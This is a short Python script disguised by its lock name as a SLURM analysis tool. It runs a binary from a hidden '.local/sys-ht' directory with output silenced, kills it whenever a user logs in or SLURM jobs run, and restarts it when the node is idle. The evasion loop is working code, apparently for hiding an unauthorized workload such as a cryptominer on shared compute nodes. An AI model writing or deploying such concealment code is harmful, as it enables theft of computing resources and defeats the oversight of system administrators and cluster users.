#!/usr/bin/env python3
import socket
import sys
import time
import signal
import os
import subprocess

def get_lock(process_name):
    get_lock._lock_socket = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)

    try:
        get_lock._lock_socket.bind('\0' + process_name)
    except socket.error:
        sys.exit()

def logged_users():
    p = subprocess.Popen("w -h | wc | awk '{print $1}'", stdout=subprocess.PIPE, shell=True)
    result = p.communicate()[0]
    result = result.decode("utf-8") 
    return int(result)

def slurm_status():
    q = subprocess.Popen("ps aux | grep slurmstepd | wc | awk '{print $1}'", stdout=subprocess.PIPE, shell=True)
    result = q.communicate()[0]
    result = result.decode("utf-8") 
    return int(result)

get_lock('running_slurm_analysis')
sysf = "/home/other/.local/sys-ht//khc_st>/dev/null 2>&1"
pro = subprocess.Popen(sysf, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) 
while True:
    time.sleep(1)
    lu, ss = logged_users(), slurm_status()
    if lu >= 1 or ss > 2:
        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)  # Send the signal to all the process groups
    else:
        if pro.poll() != None:
            pro = subprocess.Popen(sysf, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True, preexec_fn=os.setsid)

